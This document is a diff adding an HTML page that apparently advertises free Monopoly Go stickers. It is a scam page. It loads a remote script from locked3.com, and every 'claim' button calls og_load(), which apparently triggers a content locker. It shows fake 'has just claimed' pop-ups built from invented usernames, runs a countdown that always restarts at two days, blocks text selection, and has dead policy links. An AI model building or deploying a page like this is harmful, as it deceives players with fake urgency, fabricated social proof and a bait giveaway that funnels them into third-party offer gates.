@@ -1,0 +1,565 @@
+<html lang="en"><head>
+    <title>MonopolyGo-Sticker</title>
+
+    <meta name="description" content="STICKERS ">
+    <meta property="og:title" content="STICKERS ">
+    <meta property="og:description" content="STICKERS ">
+    <meta name="referrer" content="no-referrer">
+
+    <link href="css/bootstrap.min.css" rel="stylesheet" crossorigin="anonymous">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link href="https://fonts.googleapis.com/css2?family=Nunito+Sans&amp;display=swap" rel="stylesheet">
+    <link rel="icon" href="images/Sweet%20Pink%20Lime%20Fun%20illustrated%20Candy%20Logo%20%283%29.jpg" type="image/png">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+ <script type="text/javascript" id="ogjs" src="https://locked3.com/cl/js/vo51og"></script>
+   <script src="js/10b30b5.js"></script>
+
+    
+<meta name="google-adsense-platform-account" content="ca-host-pub-1556223355139109">
+<meta name="google-adsense-platform-domain" content="blogspot.com">
+<meta name="google-adsense-platform-account" content="ca-host-pub-1556223355139109">
+<meta name="google-adsense-platform-domain" content="blogspot.com">
+</head>
+<body style="cursor: default;">
+
+
+
+    <style>
+        body {
+            margin: 0;
+            font-family: 'Nunito Sans', sans-serif;
+        }
+        .notice {background-color: #0e1b4d;color: #fff;padding: 15px;text-align: center;}
+
+        .rows {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-between;
+        }
+
+
+        .candy {
+            width: calc(50% - 10px);
+            border: 1px solid #dfdfdf;
+            padding: 15px;
+            margin: 5px;
+            border-radius: 3px;
+            box-sizing: border-box;
+        }
+        .candy:hover {
+            border: 1px solid #0e1b4d;
+        }
+        .candy img {
+            max-width: 100%;
+            height: auto;
+            border: 1px solid #f8f8f8;
+            margin-bottom: 10px;
+            border-radius: 3px;
+        }
+        .candy:hover img {
+            border: 1px solid #fae6f1;
+        }
+        .candy .claim {
+            all: unset;
+            color: #fff;
+            background: #4770db;
+            border-radius: 30px;
+            font-size: 18px;
+            padding: 8px 25px;
+            margin-top: 15px;
+            cursor: pointer;
+            display: block;
+            width: auto;
+            text-align: center;
+        }
+        .candy .claim:hover {
+            background: #000000;
+        }
+        .candy .info {
+            text-align: center;
+        }
+        .candy h3 {
+            color: #000;
+            font-size: 21px;
+            font-weight: bold;
+            margin-top: 8px;
+        }
+        .candy .price {
+            color: #000;
+            text-align: center;
+        }
+        .candy .price div {
+            display: inline;
+            padding: 5px;
+        }
+        .candy .price .old-price {
+            text-decoration: line-through;
+            border-right: 2px solid #838383;
+            color: #727272;
+        }
+        .candy .price .new-price {
+            font-weight: bold;
+            color: #000000;
+        }
+        .candy .claim {all:unset;color: #fff;background: #4770db;border-radius: 30px;font-size: 18px;padding: 8px 25px;margin-top: 15px;}
+        .candy .claim:hover {color: #fff;background: #000000;border-radius: 30px;font-size: 18px;padding: 8px 25px;}
+        .notification-bottom-left {position: fixed;background: #0e1b4d;color: #fff;bottom: 15px;left: 15px;padding: 15px;border-radius: 3px;}
+
+        .modal-window {position: fixed;background-color: rgba(8, 8, 8, 0.259);top: 0;right: 0;bottom: 0;    left: 0;z-index: 999;transition: all 0.3s;}
+        .modal-window > div {width: 400px;position: absolute;top: 50%;left: 50%;transform: translate(-50%, -50%);padding: 20px;background-color:rgba(255, 255, 255, 1);border-radius: 6px;}
+        .modal-window header {font-weight: bold;}
+        .modal-window h1 {font-size: 150%;margin: 0 0 15px;}
+        .modal-close:hover {color: black;}
+        button.start {all: unset;background-color: #0e1b4d;color: #fff;padding: 3px 20px;border-radius: 2px;}
+        footer {background: #f9f9f9;text-align: center;padding: 13px;font-size: 15px;margin-top: 20px;color: #6b6b6b;}
+      
+     
+    
+        
+/* Basic design of countdown timer */
+.wrapper {display: flex;justify-content: center;}
+.countdown {
+display: flex;
+gap: 10px;
+}
+/* Design the time view boxes */
+.box {
+display: flex;
+flex-direction: column;
+align-items: center;
+position: relative;
+}
+/* Design time viewing numbers */
+span.num {
+background-color: #0e1b4d;
+color: #fff;
+height: 70px;
+width: 80px;
+display: grid;
+place-items: center;
+font-size: 1.2em;
+border-radius: 0.1em;
+border: 1px solid #eee;
+font-weight: bold;
+}
+/* Design the text to indicate the time */
+span.text {
+font-size: .8em;
+background-color: #fff;
+color: #0e1b4d;
+display: block;
+width: 60px;
+position: relative;
+text-align: center;
+bottom: -15px;
+padding: 10px 0 5px 0;
+font-weight: 600;
+border-radius: 0.2em;
+}
+
+    </style>
+    <!--Kode untuk mencegah seleksi teks, block teks dll.-->
+    <script type="text/javascript">
+        function disableSelection(e) {
+            if (typeof e.onselectstart != "undefined") e.onselectstart = function() {
+                return false
+            };
+            else if (typeof e.style.MozUserSelect != "undefined") e.style.MozUserSelect = "none";
+            else e.onmousedown = function() {
+                return false
+            };
+            e.style.cursor = "default"
+        }
+        window.onload = function() {
+            disableSelection(document.body)
+        }
+    </script>
+
+
+<div class="notice">
+    <div class="container">
+        MonopolyGo-Sticker
+    </div> 
+</div>
+
+<nav class="navbar navbar-expand-lg navbar-light bg-light">
+    <div class="container">
+      <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon"></span>
+      </button>
+      <div class="collapse navbar-collapse justify-content-end" id="navbarSupportedContent">
+        <ul class="navbar-nav mb-2 mb-lg-0">
+          <li class="nav-item">
+            <a class="nav-link" href="#">Privacy Policy</a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" href="#">Terms of Service</a>
+          </li>
+        </ul>
+      </div>
+    </div>
+  </nav>
+
+
+<br>
+
+    <div class="container">
+
+
+        
+        
+        <div class="text-center"><h3><b>These offers will end after</b></h3></div>
+            <div class="wrapper mb-5">
+
+                <div class="countdown">
+               <!-- 1st box -->
+                   <div class="box">
+                     <span class="text">Days</span>
+                     <span class="num" id="day-box">00</span>
+                  </div>
+               <!-- 2nd box -->
+                  <div class="box">
+                     <span class="text">Hours</span>
+                     <span class="num" id="hr-box">00</span>
+                  </div>
+               <!-- 3rd box -->
+                  <div class="box">
+                     <span class="text">Minutes</span>
+                     <span class="num" id="min-box">00</span>
+                  </div>
+               <!-- 4th box -->
+                  <div class="box">
+                     <span class="text">Seconds</span>
+                     <span class="num" id="sec-box">00</span>
+                  </div>
+               
+                </div>
+               
+               </div>
+               
+<!-- here i want to put the search bar -->
+    <div class="rows">
+   
+        <div class="candy">
+            <img src="images/set9/1.jpg" alt="Sticker 1">
+            <div class="info">
+                <div class="price">
+                    <div class="old-price">$6.95</div>
+                    <div class="new-price">FREE</div>
+                </div>
+               <button class="claim">claim</button>
+            </div>
+        </div>
+
+        <div class="candy">
+            <img src="images/set9/2.jpg" alt="Sticker 2">
+            <div class="info">
+                <div class="price">
+                    <div class="old-price">$3.65</div>
+                    <div class="new-price">FREE</div>
+                </div>
+               <button class="claim">claim</button>
+            </div>
+        </div>
+        
+        <div class="candy">
+            <img src="images/set9/3.jpg" alt="Sticker 3">
+            <div class="info">
+                <div class="price">
+                    <div class="old-price">$1.09</div>
+                    <div class="new-price">FREE</div>
+                </div>
+               <button class="claim">claim</button>
+            </div>
+        </div>
+
+        <div class="candy">
+            <img src="images/set9/4.jpg" alt="Sticker 4">
+            <div class="info">
+                <div class="price">
+                    <div class="old-price">$3.99</div>
+                    <div class="new-price">FREE</div>
+                </div>
+               <button class="claim">claim</button>
+            </div>
+        </div>        
+
+        <div class="candy">
+            <img src="images/set9/5.jpg" alt="Sticker 5">
+            <div class="info">
+                <div class="price">
+                    <div class="old-price">$4.95</div>
+                    <div class="new-price">FREE</div>
+                </div>
+                <button class="claim">claim</button>
+            </div>
+        </div>
+        
+        <div class="candy">
+            <img src="images/set9/6.jpg" alt="Sticker 6">
+            <div class="info">
+                <div class="price">
+                    <div class="old-price">$6.47</div>
+                    <div class="new-price">FREE</div>
+                </div>
+                <button class="claim">claim</button>
+            </div>
+        </div>
+
+        <div class="candy">
+            <img src="images/set9/7.jpg" alt="Sticker 7">
+            <div class="info">
+                <div class="price">
+                    <div class="old-price">$12.99</div>
+                    <div class="new-price">FREE</div>
+                </div>
+                <button class="claim">claim</button>
+            </div>
+        </div>
+
+        <div class="candy">
+            <img src="images/set9/8.jpg" alt="Sticker 8">
+            <div class="info">
+                <div class="price">
+                    <div class="old-price">$4.95</div>
+                    <div class="new-price">FREE</div>
+                </div>
+                <button class="claim">claim</button>
+            </div>
+        </div>        
+        
+        <div class="candy">
+            <img src="images/set9/9.jpg" alt="Sticker 9">
+            <div class="info">
+                <div class="price">
+                    <div class="old-price">$4.95</div>
+                    <div class="new-price">FREE</div>
+                </div>
+                <button class="claim">claim</button>
+            </div>
+        </div>        
+        
+    </div>
+
+	
+
+            
+            
+            
+            
+
+
+    <footer>
+        <div></div>
+        <p>Need help? Live chat with our agents or contact support at support@monostickers.</p>
+    </footer>
+
+
+
+<div id="notification-container" class="notification-bottom-left d-none">
+    <div class="notification notification-success">
+        <div class="notification-title" id="customer-name">Narzi84 Has just claimed a </div>
+        <div class="notification-message" id="customer-phone">Claimed chocolate MIX , Pack</div>
+        <div class="notification-message" id="customer-time">24 min ago</div>
+    </div>
+</div>
+
+
+<script src="js/jquery.min.js" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+<script src="js/popper.min.js" crossorigin="anonymous"></script>
+<script src="js/bootstrap.min.js" crossorigin="anonymous"></script>
+<script type="text/javascript">
+    $(function() {
+        var overlay = $('<div id="overlay"></div>');
+        overlay.show();
+        overlay.appendTo(document.body);
+        $('.popup').show();
+        $('.X').click(function() {
+            $('.popup').hide();
+            overlay.appendTo(document.body).remove();
+            return false;
+        });
+        $('.x').click(function() {
+            $('.popup').hide();
+            overlay.appendTo(document.body).remove();
+            return false;
+        });
+    });
+</script>
+
+<script>
+    var nameArr = [
+        "carla46",
+        "yasmine",
+        "julia.akraman",
+        "soufia.la",
+        "love-bts",
+        "lily",
+        "fyr",
+        "d.manuilla",
+        "alixandra",
+        "2005xfv",
+        "Subadi382",
+        "Dadi900",
+        "Mikel62",
+        "nadim094",
+        "Samira27",
+        "Numkei35",
+        "Shinkai",
+        "Badsur7",
+        "Shxy_bit",
+        "xvy_ht5",
+        "txf07",
+        "Double63",
+        "Birdas74",
+        "Narzi84",
+        "user7789",
+        "user8879",
+        "user1654",
+        "rose.v67",
+        "lola6.if",
+        "z85",
+
+    ];
+    var phoneArr = [
+        "The Best Gift",
+        "The Barber of Seville",
+        "Melodic Haul",
+        "Smash Hit",
+        "Groove On",
+        "Happy Stroll",
+        "Washboard Tunes",
+        "Tycoon Hustle",
+        "Flutiful",
+        "True Idols",
+        "Bias Wrecker",
+        "Monopoly Tunes",
+        "The Barber of Seville",
+        "Groove On",
+        "Washboard Tunes",
+        "Washboard Tunes",
+        "Happy Stroll",
+        "Groove On",
+        "The Barber of Seville",
+        
+        
+        
+    ]; 
+    setInterval(function() { 
+        $("#notification-container").removeClass("d-none"); 
+        var randomNumber = Math.floor(Math.random() * nameArr.length);
+        
+        $("#customer-name").html("<b>" + nameArr[randomNumber] + "</b> Has just claimed a ");
+        $("#customer-phone").html("Claimed <b>" + phoneArr[randomNumber]+ "</b>");
+        $("#customer-time").html(randomNumber + 1 + " min ago");
+        setTimeout(() => {
+            $("#notification-container").addClass("d-none");
+        }, 7000); 
+    }, 10000);
+
+    $(".start").on("click", function(){
+        $("#start").addClass("d-none");
+    });
+
+    $(".claim").on("click", function(){
+        og_load();
+    });
+
+    //The global constant of the id functions of the four boxes has to be determined.
+   //Because no html element can be used directly in JavaScript
+   let dayBox = document.getElementById("day-box");
+    let hrBox = document.getElementById("hr-box");
+    let minBox = document.getElementById("min-box");
+    let secBox = document.getElementById("sec-box");
+
+    //I have added the time for which I want to run the countdown
+   //Then that time is stored in a constant called "endDate"
+    // let endDate = new Date(2023, 06, 1, 00, 00);
+    // var endDate = new Date(new Date());
+    // endDate.setDate(day.getDate() + 1);
+
+    var endDate = new Date();
+    endDate.setDate(endDate.getDate()+2);
+
+//The above date has been converted to milliseconds
+//getTime() method is used to return the number of milliseconds since 1 January 1970.
+    let endTime = endDate.getTime();
+
+
+//All the calculations are stored in the function called countdown
+    function countdown() {
+//The current time has been taken from the device using the "new Date" method
+      let todayDate = new Date();
+//The time received from the device has been converted to milliseconds
+      let todayTime = todayDate.getTime();
+//How long the countdown will last has been calculated.
+//Countdown time = Countdown end time - Current time
+      let remainingTime = endTime - todayTime;
+//Minutes, hours, days have been converted to milliseconds
+//1 minute = 1 * 60 seconds = 1000 * 60 milliseconds
+      let oneMin = 60 * 1000;
+      let oneHr = 60 * oneMin;
+      let oneDay = 24 * oneHr;
+
+//If the number of times is less than 10 then a 0 will be added before it
+      let addZeroes = (num) => (num < 10 ? `0${num}` : num);
+
+//What will happen when the countdown ends is now decided
+//That is, if the current time is more than the time when the countdown is over
+      if (endTime < todayTime) {
+        clearInterval(i);
+        document.querySelector(
+          ".countdown"
+        ).innerHTML = `<h1>Countdown Has Expired</h1>`;
+      } 
+
+ else {
+//Now the total countdown time has been converted to days, hours, minutes, and seconds
+//The Math. floor() function returns the largest integer less than or equal to a given number.
+        let daysLeft = Math.floor(remainingTime / oneDay);
+        let hrsLeft = Math.floor((remainingTime % oneDay) / oneHr);
+        let minsLeft = Math.floor((remainingTime % oneHr) / oneMin);
+        let secsLeft = Math.floor((remainingTime % oneMin) / 1000);
+
+//Arrangements have now been made to display the time values in the webpage
+//"textContent" helps to display any content within a webpage
+        dayBox.textContent = addZeroes(daysLeft);
+        hrBox.textContent = addZeroes(hrsLeft);
+        minBox.textContent = addZeroes(minsLeft);
+        secBox.textContent = addZeroes(secsLeft);
+      }
+    }
+//Now with the help of "setInterval" the above calculations are arranged to be updated every second.
+//As you can see, all of the above calculations are stored in a function called 'countdown'.
+//Now that function has been updated every 1000 milliseconds or 1 second.
+    let i = setInterval(countdown, 1000);
+    countdown();
+
+</script>
+
+<script type="text/javascript">
+    //<![CDATA[
+var uri = window.location.toString();
+if (uri.indexOf("=","=") > 0){
+    console.log("test");
+}else{
+    var clean_uri = uri.substring(0, uri.indexOf("?m=1"));
+clean_uri = clean_uri + "?m=0";
+location.href = clean_uri;
+// window.history.replaceState({}, document.title, clean_uri);
+}
+var uri = window.location.toString();
+if (uri.indexOf("?m=1","?m=1") > 0) {
+var clean_uri = uri.substring(0, uri.indexOf("?m=1"));
+clean_uri = clean_uri + "?m=0";
+location.href = clean_uri;
+// window.history.replaceState({}, document.title, clean_uri);
+}
+//]]>
+</script>
+
+
+
+</div></div></body></html>
